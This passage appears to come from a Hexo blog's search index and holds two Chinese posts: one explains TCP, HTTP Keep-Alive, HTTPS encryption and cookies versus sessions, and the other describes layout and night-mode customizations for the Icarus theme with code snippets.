那么，再说一次TCP的特点： TCP是面向连接的。（就好像打电话一样，通话前需要先拨号建立连接，通话结束后要挂机释放连接）； 每一条TCP连接只能有两个端点，每一条TCP连接只能是点对点的（一对一）； TCP提供可靠交付的服务。通过TCP连接传送的数据，无差错、不丢失、不重复、并且按序到达； TCP提供全双工通信。TCP允许通信双方的应用进程在任何时候都能发送数据。TCP连接的两端都设有发送缓存和接收缓存，用来临时存放双方通信的数据； 面向字节流。TCP中的“流”（stream）指的是流入进程或从进程流出的字节序列。“面向字节流”的含义是：虽然应用程序和TCP的交互是一次一个数据块（大小不等），但TCP把应用程序交下来的数据仅仅看成是一连串的无结构的字节流。 TCP Keepalive 和 HTTP Keep-Alive事实上，这两个完全是两样不同东西，实现的层面也不同： HTTP 的 Keep-Alive，是由应用层（用户态） 实现的，称为 HTTP 长连接； TCP 的 Keepalive，是由 TCP 层（内核态） 实现的，称为 TCP 保活机制； HTTP 的 Keep-Alive Http 1.0 短链接 Http 1.1 长链接 HTTP 的 Keep-Alive 可以使用同一个 TCP 连接来发送和接收多个 HTTP 请求/应答，避免了连接建立和释放的开销，这个方法称为 HTTP 长连接。从 HTTP 1.1 开始， 就默认是开启了 Keep-Alive。为了避免资源浪费的情况，web 服务软件一般都会提供 keepalive_timeout 参数，用来指定 HTTP 长连接的超时时间。比如设置了 HTTP 长连接的超时时间是 60 秒，web 服务软件就会启动一个定时器，如果客户端在完后一个 HTTP 请求后，在 60 秒内都没有再发起新的请求，定时器的时间一到，就会触发回调函数来释放该连接。 TCP 的 Keepalive如果两端的 TCP 连接一直没有数据交互，达到了触发 TCP 保活机制的条件，那么内核里的 TCP 协议栈就会发送探测报文。 如果对端程序是正常工作的。当 TCP 保活的探测报文发送给对端, 对端会正常响应，这样 TCP 保活时间会被重置，等待下一个 TCP 保活时间的到来。 如果对端主机崩溃，或对端由于其他原因导致报文不可达。当 TCP 保活的探测报文发送给对端后，石沉大海，没有响应，连续几次，达到保活探测次数后，TCP 会报告该 TCP 连接已经死亡。 所以，TCP 保活机制可以在双方没有数据交互的情况，通过探测报文，来确定对方的 TCP 连接是否存活，这个工作是在内核完成的。 总结 HTTP 的 Keep-Alive 也叫 HTTP 长连接，该功能是由「应用程序」实现的，可以使得用同一个 TCP 连接来发送和接收多个 HTTP 请求/应答，减少了 HTTP 短连接带来的多次 TCP 连接建立和释放的开销。 TCP 的 Keepalive 也叫 TCP 保活机制，该功能是由「内核」实现的，当客户端和服务端长达一定时间没有进行数据交互时，内核为了确保该连接是否还有效，就会发送探测报文，来检测对方是否还在线，然后来决定是否要关闭该连接。HTTP 与 HTTPSHTTP 与 HTTPS 区别 HTTP 是超文本传输协议，信息是明文传输，存在安全风险的问题。HTTPS 则解决 HTTP 不安全的缺陷，在 TCP 和 HTTP 网络层之间加入了 SSL/TLS 安全协议，使得报文能够加密传输。 HTTP 连接建立相对简单， TCP 三次握手之后便可进行 HTTP 的报文传输。而 HTTPS 在 TCP 三次握手之后，还需进行 SSL/TLS 的握手过程，才可进入加密报文传输。 HTTP 的端口号是 80，HTTPS 的端口号是 443。 HTTPS 协议需要向 CA（证书权威机构）申请数字证书，来保证服务器的身份是可信的。 HTTP 由于是明文传输，所以安全上存在以下三个风险： 窃听风险，比如通信链路上可以获取通信内容，用户号容易没。 篡改风险，比如强制植入垃圾广告，视觉污染，用户眼容易瞎。 冒充风险，比如冒充淘宝网站，用户钱容易没。 HTTPS 在 HTTP 与 TCP 层之间加入了 SSL/TLS 协议，可以很好的解决了上述的风险： 信息加密：交互信息无法被窃取，但你的号会因为「自身忘记」账号而没。 校验机制：无法篡改通信内容，篡改了就不能正常显示，但百度「竞价排名」依然可以搜索垃圾广告。 身份证书：证明淘宝是真的淘宝网，但你的钱还是会因为「剁手」而没。 HTTPS 混合加密的方式实现信息的机密性，解决了窃听的风险。 摘要算法的方式来实现完整性，它能够为数据生成独一无二的「指纹」，指纹用于校验数据的完整性，解决了篡改的风险。 将服务器公钥放入到数字证书中，解决了冒充的风险。 混合加密通过混合加密的方式可以保证信息的机密性，解决了窃听的风险。HTTPS 采用的是对称加密和非对称加密结合的「混合加密」方式： 在通信建立前采用非对称加密的方式交换「会话秘钥」，后续就不再使用非对称加密。 在通信过程中全部使用对称加密的「会话秘钥」的方式加密明文数据。 采用「混合加密」的方式的原因： 对称加密只使用一个密钥，运算速度快，密钥必须保密，无法做到安全的密钥交换。 非对称加密使用两个密钥：公钥和私钥，公钥可以任意分发而私钥保密，解决了密钥交换问题但速度慢。摘要算法那么，在计算机里会用摘要算法（哈希函数）来计算出内容的哈希值，也就是内容的「指纹」，这个哈希值是唯一的，且无法通过哈希值推导出内容。 通过哈希算法可以确保内容不会被篡改，但是并不能保证「内容 + 哈希值」不会被中间人替换，因为这里缺少对客户端收到的消息是否来源于服务端的证明。 公钥加密，私钥解密。这个目的是为了保证内容传输的安全，因为被公钥加密的内容，其他人是无法解密的，只有持有私钥的人，才能解密出实际的内容； 私钥加密，公钥解密。这个目的是为了保证消息不会被冒充，因为私钥是不可泄露的，如果公钥能正常解密出私钥加密的内容，就能证明这个消息是来源于持有私钥身份的人发送的。数字证书在计算机里，这个权威的机构就是 CA （数字证书认证机构），将服务器公钥放在数字证书（由数字证书认证机构颁发）中，只要证书是可信的，公钥就是可信的。 Cookie与Session的对比HTTP作为无状态协议，必然需要在某种方式保持连接状态。这里简要介绍一下Cookie和Session。Cookie Cookie是客户端保持状态的方法。Cookie简单的理解就是存储由服务器发至客户端并由客户端保存的一段字符串。为了保持会话，服务器可以在响应客户端请求时将Cookie字符串放在Set-Cookie下，客户机收到Cookie之后保存这段字符串，之后再请求时候带上Cookie就可以被识别。除了上面提到的这些，Cookie在客户端的保存形式可以有两种，一种是会话Cookie一种是持久Cookie，会话Cookie就是将服务器返回的Cookie字符串保持在内存中，关闭浏览器之后自动销毁，持久Cookie则是存储在客户端磁盘上，其有效时间在服务器响应头中被指定，在有效期内，客户端再次请求服务器时都可以直接从本地取出。需要说明的是，存储在磁盘中的Cookie是可以被多个浏览器代理所共享的。 Session Session是服务器保持状态的方法。首先需要明确的是，Session保存在服务器上，可以保存在数据库、文件或内存中，每个用户有独立的Session用户在客户端上记录用户的操作。我们可以理解为每个用户有一个独一无二的Session ID作为Session文件的Hash键，通过这个值可以锁定具体的Session结构的数据，这个Session结构中存储了用户操作行为。 当服务器需要识别客户端时就需要结合Cookie了。每次HTTP请求的时候，客户端都会发送相应的Cookie信息到服务端。实际上大多数的应用都是用Cookie来实现Session跟踪的，第一次创建Session的时候，服务端会在HTTP协议中告诉客户端，需要在Cookie里面记录一个Session ID，以后每次请求把这个会话ID发送到服务器，我就知道你是谁了。如果客户端的浏览器禁用了Cookie，会使用一种叫做URL重写的技术来进行会话跟踪，即每次HTTP交互，URL后面都会被附加上一个诸如sid=xxxxx这样的参数，服务端据此来识别用户，这样就可以帮用户完成诸如用户名等信息自动填入的操作了。","link":"/2022/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"title":"Icarus主题魔改","text":"Icarus主题布局、夜间模式设置 Icarus布局加宽两栏布局由于原版的三栏模式对文章而言，中间栏实在拥挤了，一行没几个字就换行，加上图片显示太小。可按照一下步骤将二三栏宽度合并。 layout/layout.jsx 123456'is-12': columnCount === 1,// 修改宽度为 8 9 9// 'is-8-tablet is-8-desktop is-8-widescreen': columnCount === 2, 'is-8-tablet is-9-desktop is-9-widescreen': columnCount === 2, 'is-8-tablet is-8-desktop is-6-widescreen': columnCount === 3 include/style/responsive.styl 1234567891011121314/* 修改对应的布局 */+widescreen() .is-1-column .container, .is-2-column .container /* max-width: $desktop - 2 * $gap */ /* width: $desktop - 2 * $gap */ max-width: $widescreen - 2 * $gap width: $widescreen - 2 * $gap+fullhd() .is-2-column .container /* max-width: $widescreen - 2 * $gap */ /* width: $widescreen - 2 * $gap */ max-width: $fullhd - 2 * $gap width: $fullhd - 2 * $gap layout/common/widgets.jsx 123456789function getColumnSizeClass(columnCount) { switch (columnCount) { case 2: // 修改为 4 3 3 // return 'is-4-tablet is-4-desktop is-4-widescreen'; return 'is-4-tablet is-3-desktop is-3-widescreen'; case 3: return 'is-4-tablet is-4-desktop is-3-widescreen'; } 固定目录在左侧在 icarus 3.0 中, 类似于 toc, tag 等小部件不在默认的主题文件家中, 而是集成到了 hexo-component-inferno 这个依赖模块中. 因此想要改动这些内容的话, 需要手动地将toc.jsx 文件复制到 layout/widget/toc.jsx 中. 因为在使用时并不想简单地将左右两栏固定, 而是想要实现对于不同的卡片, 设置不同的滚动方式. 比如, 对于文章内现实的目录卡片, 设置成固定, 并进入滚动条, 代码修改的内容如下: 加入了 column-left is-sticky 这两个 class 设置滚动条: style=&quot;max-height: calc(100vh - 5rem); overflow-y: auto;&quot; layout/widget/toc.jsx 12345678910111213141516171819202122// 第 5 行const { tocObj: getTocObj, unescapeHTML } = require('hexo-util');const { Component } = require('inferno');const { cacheComponent } = require('hexo-component-inferno/lib/util/cache');// 第 112 行 render() { const toc = getToc(this.props.content); if (!Object.keys(toc).length) { return null; } // return &lt;div class=&quot;card widget&quot; id=&quot;toc&quot;&gt; return &lt;div class=&quot;card widget column-left is-sticky&quot; id=&quot;toc&quot;&gt; &lt;div class=&quot;card-content&quot;&gt; &lt;div class=&quot;menu&quot; style=&quot;max-height: calc(100vh - 5rem); overflow-y: auto;&quot;&gt; &lt;h3 class=&quot;menu-label&quot;&gt;{this.props.title}&lt;/h3&gt; {this.renderToc(toc)} &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;; } 主题夜间模式效果展示 新增night.styl在icarus/source/css 目录下创建 night.sytl 文件（展开显示代码） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378dark-primary-color = rgb(55, 61, 72)dark-primary-color-hover = rgb(67, 74, 86)dark-primary-color-active = rgb(44, 49, 58)dark-font-color = #c0c0c0#universe display: none.navbar-logo,.footer-logo .logo-img-dark display: nonebody.night background: #0e1225.night // code highlight (https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-dark.min.css) // navigation bar, cards .content code color: rgb(203,186,125) // night icon changed to fas fa-moon-o #night-nav #night-icon:before content: '\\f186' .navbar-menu background-color: inherit .navbar-main .navbar-menu .navbar-item &amp;:hover, &amp;:focus color: #ffffff background-color: dark-primary-color .navbar, .card background-color: rgba(40, 44, 52, 0.5) backdrop-filter: none -webkit-backdrop-filter: none .card &amp;:hover background-color: rgba(40, 44, 52, 0.8) .footer background-color: rgba(40, 44, 52, 0.5) backdrop-filter: none -webkit-backdrop-filter: none &amp;:before background-color: rgba(40, 44, 52, 0.5) // input .input, .textarea background-color: dark-primary-color-hover border-color: dark-primary-color // message .message.message-immersive background-color: #c2c2c2 .message-body color: #222222 .message.message-immersive.is-info background-color: #bdc3c8 .message-body color: #004779 .message.message-immersive.is-warning background-color: #cbc8ba .message-body color: #5b4b00 .message.message-immersive.is-danger background-color: #c6babe .message-body color: #79000f .message.message-immersive.is-success background-color: #bfc7c0 .message-body color: #1e4d1c .message.message-immersive.is-primary background-color: #bdc0c9 .message-body color: #003790 // button .button.is-primary, .button.is-light, .button.is-small background-color: dark-primary-color color: dark-font-color &amp;:hover, &amp;.is-hovered color: #ffffff background-color: dark-primary-color-hover &amp;:active, &amp;.is-active color: #ffffff background-color: dark-primary-color-active .button.is-white, .button.is-transparent background-color: transparent &amp;:hover background-color: dark-primary-color !important .pagination .pagination-next, .pagination .pagination-previous .pagination-link:not(.is-current) color: dark-font-color // button .button.is-primary, .button.is-light, .button.is-small background-color: dark-primary-color color: dark-font-color &amp;:hover, &amp;.is-hovered color: #ffffff background-color: dark-primary-color-hover &amp;:active, &amp;.is-active color: #ffffff background-color: dark-primary-color-active .button.is-white, .button.is-transparent background-color: transparent &amp;:hover background-color: dark-primary-color !important .pagination .pagination-next, .pagination .pagination-previous .pagination-link:not(.is-current) color: dark-font-color background-color: dark-primary-color a color: dark-font-color .pagination-link.is-current background-color: dark-primary-color-hover border-color: dark-primary-color-hover // comment .v .vwrap, .v .vwrap .vheader .vinput border-color: dark-primary-color .v .vwrap .vheader .vinput:focus border-color: dark-primary-color-hover .v .vbtn color: dark-font-color background-color: dark-primary-color border-color: dark-primary-color &amp;:hover background-color: dark-primary-color-hover &amp;:active background-color: dark-primary-color-active .v .vlist .vcard .vhead .vsys background-color: dark-primary-color .v a:hover, .v .vlist .vcard .vh .vmeta .vat color: #ffffff .v .vlist .vcard .vcontent.expand:before background: -webkit-gradient(linear, left top, left bottom, from(rgba(37, 41, 54, 0)), to(rgba(37, 41, 54, 1))) background: linear-gradient(180deg, rgba(37, 41, 54, 0), rgba(37, 41, 54, 1)) .v .vlist .vcard .vcontent.expand:after background: rgba(37, 41, 54, 1) .v .vlist .vcard .vh, .v .vlist .vcard .vquote border-color: dark-primary-color-hover // font color body, strong, time, .title, .footer, .card, .content h1, .content h2, .content h3, .content h4, .content h5, .content h6, .navbar-item, .navbar-item.is-active, .navbar-link, .menu-list a, .menu-label, .level-item, .input, .textarea, .button.is-white, .button.is-transparent, .article-licensing, .v * color: dark-font-color .media-content, .has-text-grey, .link-muted color: dark-font-color !important a color: rgb(82, 153, 224) &amp;:hover color: #ffffff // quote .content blockquote, .article-licensing background-color: dark-primary-color border-color: dark-primary-color-hover .post-copyright background-color: dark-primary-color border-color: dark-primary-color-hover // table .content table thead td, .content table thead th color: dark-font-color .content table td, .content table th border-color: dark-primary-color-hover // break line hr background-color: dark-primary-color-hover // tags and menus article.article, article.media .title:hover a // override anotherr !important color: dark-font-color !important .tag:not(body) color: dark-font-color background-color: dark-primary-color .tag.is-grey background-color: dark-primary-color-hover .menu-list a:hover background-color: dark-primary-color .menu-list a.is-active background-color: dark-primary-color-hover .menu-list li ul border-color: dark-primary-color // time line .timeline .media:last-child:after background-color: rgb(37, 41, 54) .timeline border-color: dark-primary-color-hover .timeline .media:before background-color: dark-primary-color-hover // search box .searchbox .searchbox-container, .searchbox-header, .searchbox-header .searchbox-input, .searchbox-header .searchbox-close, .searchbox-body, .searchbox-result-section, .searchbox-result-item color: dark-font-color background-color: dark-primary-color border-color: dark-primary-color-hover .searchbox-container .searchbox-result-section .searchbox-result-item:hover, .searchbox-container .searchbox-result-section .searchbox-result-item.active, .searchbox-container .searchbox-header .searchbox-close:hover color: #ffffff background-color: dark-primary-color-hover // selection ::selection color: #ffffff background-color: rgba(52, 109, 167, 0.8) ::-moz-selection color: #ffffff background-color: rgba(52, 109, 167, 0.8) input:-webkit-autofill -webkit-text-fill-color: dark-font-color !important box-shadow: 0 0 0px 1000px dark-primary-color inset .hljs { display: block; overflow-x: auto; padding: 0.5em; color: #abb2bf; background: #282c34 } .hljs-comment, .hljs-quote { color: #5c6370; font-style: italic } .hljs-doctag, .hljs-keyword, .hljs-formula { color: #c678dd } .hljs-section, .hljs-name, .hljs-selector-tag, .hljs-deletion, .hljs-subst { color: #e06c75 } .hljs-literal { color: #56b6c2 } .hljs-string, .hljs-regexp, .hljs-addition, .hljs-attribute, .hljs-meta-string { color: #98c379 } .hljs-built_in, .hljs-class .hljs-title { color: #e6c07b } .hljs-attr, .hljs-variable, .hljs-template-variable, .hljs-type, .hljs-selector-class, .hljs-selector-attr, .hljs-selector-pseudo, .hljs-number { color: #d19a66 } .hljs-symbol, .hljs-bullet, .hljs-link, .hljs-meta, .hljs-selector-id, .hljs-title { color: #61aeee } .hljs-emphasis { font-style: italic } .hljs-strong { font-weight: bold } .hljs-link { text-decoration: underline } 修改 default.styl 文件在icarus/source/css/default.styl末尾新增@import 'night' 12@import 'style'@import 'night' 新增 night.js 文件在 icarus/source/js 目录下创建 night.js 文件 1234567891011121314151617181920212223242526272829303132333435363738(function () { /** * Icarus 夜间模式 by iMaeGoo * https://www.imaegoo.com/ */ var isNight = localStorage.getItem('night'); var nightNav; function applyNight(value) { if (value.toString() === 'true') { document.body.classList.remove('light'); document.body.classList.add('night'); } else { document.body.classList.remove('night'); document.body.classList.add('light'); } } function findNightNav() { nightNav = document.getElementById('night-nav'); if (!nightNav) { setTimeout(findNightNav, 100); } else { nightNav.addEventListener('click', switchNight); } } function switchNight() { isNight = isNight ? isNight.toString() !== 'true' : true; applyNight(isNight); localStorage.setItem('night', isNight); } findNightNav(); isNight &amp;&amp; applyNight(isNight);}()); 修改 scripts.jsx在icarus/layout/common/scripts.jsx 中的 return &lt;Fragment&gt;&lt;/Fragment&gt;里新增 1&lt;script src={url_for('/js/night.js')} defer={true}&gt;&lt;/script&gt; 修改 navbar.jsx在 icarus/layout/common/navbar.jsx中的 &lt;div class=&quot;navbar-end&quot;&gt;下新增 123&lt;a class=&quot;navbar-item night&quot; id=&quot;night-nav&quot; title=&quot;Night Mode&quot; href=&quot;javascript:;&quot;&gt; &lt;i class=&quot;fas fa-lightbulb&quot; id=&quot;night-icon&quot;&gt;&lt;/i&gt;&lt;/a&gt;","link":"/2023/05/02/Icarus%E4%B8%BB%E9%A2%98%E9%AD%94%E6%94%B9/"}],"tags":[{"name":"JUC","slug":"JUC","link":"/tags/JUC/"},{"name":"消息队列","slug":"消息队列","link":"/tags/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/"},{"name":"Redis","slug":"Redis","link":"/tags/Redis/"},{"name":"mysql","slug":"mysql","link":"/tags/mysql/"},{"name":"spring","slug":"spring","link":"/tags/spring/"},{"name":"反序列化","slug":"反序列化","link":"/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"k8s","slug":"k8s","link":"/tags/k8s/"},{"name":"操作系统","slug":"操作系统","link":"/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"计算机网络","slug":"计算机网络","link":"/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"hexo","slug":"hexo","link":"/tags/hexo/"}],"categories":[{"name":"Java基础","slug":"Java基础","link":"/categories/Java%E5%9F%BA%E7%A1%80/"},{"name":"后端开发","slug":"后端开发","link":"/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/"},{"name":"云原生","slug":"云原生","link":"/categories/%E4%BA%91%E5%8E%9F%E7%94%9F/"},{"name":"计算机基础","slug":"计算机基础","link":"/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"},{"name":"hexo","slug":"hexo","link":"/categories/hexo/"}],"pages":[{"title":"工牌旅行记","text":"敬请期待~","link":"/about/index.html"},{"title":"categories","text":"","link":"/categories/index.html"},{"title":"search","text":"","link":"/search/index.html"},{"title":"tags","text":"","link":"/tags/index.html"}]}